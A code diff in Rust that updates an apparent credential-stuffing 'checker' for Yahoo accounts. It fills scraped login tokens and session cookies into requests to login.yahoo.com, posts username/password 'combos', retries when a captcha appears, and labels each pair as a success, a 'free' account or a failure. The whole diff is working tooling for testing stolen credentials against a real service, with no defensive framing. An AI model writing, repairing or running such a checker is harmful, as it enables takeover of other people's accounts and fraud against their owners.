@@ -1,3 +1,5 @@
+use reqwest::header::{HeaderValue};
+
 mod static_keys;
 
 #[derive(Debug)]
@@ -38,61 +40,73 @@ impl Checker {
         combo: &Combo,
     ) -> Result<CheckerStatus, Box<dyn std::error::Error>> {
         let response = self.initial_request().await?;
-        let data = get_source_data(&response);
+        let (source, cookie) = destructure_response(response).await?;
 
+        let data = get_source_data(&source);
+
+        let post_content = yahoo_post_content(static_keys::YAHOO_POST_CONTENT, &data, combo);
         let response = self
-            .post_request(yahoo_post_url(static_keys::YAHOO_POST, data, combo))
+            .post_request(static_keys::YAHOO_POST, post_content, cookie.clone())
             .await?;
 
-        if response.contains("captcha") {
+        let (source, cookie) = destructure_response(response).await?;
+
+        if source.contains("captcha") {
             return Ok(CheckerStatus::Retry);
         }
 
-        if !response.contains("challenge/password") {
+        if !source.contains("challenge/password") {
             return Ok(CheckerStatus::Failure);
         }
 
-        let loc = "";
+        let loc = get_location(&source);
 
+        let post_content = yahoo_post_content(static_keys::YAHOO_POST_CONTENT_FINAL, &data, combo);
         let response = self
-            .post_request(format!("https://login.yahoo.com{}", loc))
+            .post_request(&format!("https://login.yahoo.com{}", loc), post_content, cookie)
             .await?;
 
-        if response.contains("https://api.login.yahoo.com/oauth2/") {
+        let (source, _cookie) = destructure_response(response).await?;
+
+        if source.contains("https://api.login.yahoo.com/oauth2/") {
             return Ok(CheckerStatus::Success);
         }
 
-        if response.contains("selector") {
+        if source.contains("selector") {
             return Ok(CheckerStatus::Free);
         }
 
         Ok(CheckerStatus::Failure)
     }
 
-    async fn initial_request(&self) -> Result<String, Box<dyn std::error::Error>> {
+    async fn initial_request(&self) -> Result<reqwest::Response, Box<dyn std::error::Error>> {
         let initial_request = self
             .client
             .request(reqwest::Method::GET, static_keys::YAHOO_LOGIN)
             .headers(get_header_map(Vec::from(static_keys::YAHOO_LOGIN_HEADERS))?)
             .build()?;
-        Ok(self.client.execute(initial_request).await?.text().await?)
+        let response = self.client.execute(initial_request).await?;
+        Ok(response)
     }
 
-    async fn post_request(&self, url: String) -> Result<String, Box<dyn std::error::Error>> {
+    async fn post_request<'a>(&'a self, url: &str, content: String, cookie: HeaderValue) -> Result<reqwest::Response, Box<dyn std::error::Error>> {
+        let mut headers = get_header_map(Vec::from(static_keys::YAHOO_POST_HEADERS))?;
+        headers.insert("Cookie", cookie);
         let post_request = self
             .client
             .request(reqwest::Method::POST, url)
-            .body(static_keys::YAHOO_POST_CONTENT)
-            .headers(get_header_map(Vec::from(static_keys::YAHOO_POST_HEADERS))?)
+            .body(content)
+            .headers(headers)
             .build()?;
-        Ok(self.client.execute(post_request).await?.text().await?)
+        let response = self.client.execute(post_request).await?;
+        Ok(response)
     }
 }
 
 fn get_source_data(response: &String) -> SourceData {
     SourceData {
-        crumb: parse_source(response, "acrumb\" value=\""),
-        acrumb: parse_source(response, "name=\"crumb\" value=\""),
+        acrumb: parse_source(response, "acrumb\" value=\""),
+        crumb: parse_source(response, "name=\"crumb\" value=\""),
         session_index: parse_source(response, "\"sessionIndex\" value=\""),
     }
 }
@@ -114,10 +128,22 @@ fn parse_source<'a>(source: &'a String, lstr: &str) -> &'a str {
     &source[start..start + end]
 }
 
-fn yahoo_post_url(url: &str, data: SourceData, combo: &Combo) -> String {
-    url.replace("<ac>", data.acrumb)
+fn yahoo_post_content(content: &str, data: &SourceData, combo: &Combo) -> String {
+    content
+        .replace("<ac>", data.acrumb)
         .replace("<c>", data.crumb)
         .replace("<si>", data.session_index)
-        .replace("<USER>", &combo.username)
-        .replace("<PASS>", &combo.password)
+        .replace("<USER>", &url_escape::encode_fragment(&combo.username))
+        .replace("<PASS>", &url_escape::encode_fragment(&combo.password))
+}
+
+async fn destructure_response(response: reqwest::Response) -> Result<(String, HeaderValue), Box<dyn std::error::Error>> {
+    let cookie = response.headers().get("set-cookie").ok_or("Error: cookie header not provided")?.clone();
+    let source = response.text().await?;
+    Ok((source, cookie))
+}
+
+fn get_location(json: &str) -> &str {
+    let location = json.split("\":\"").collect::<Vec<&str>>()[1];
+    &location[..location.len() - 2]
 }
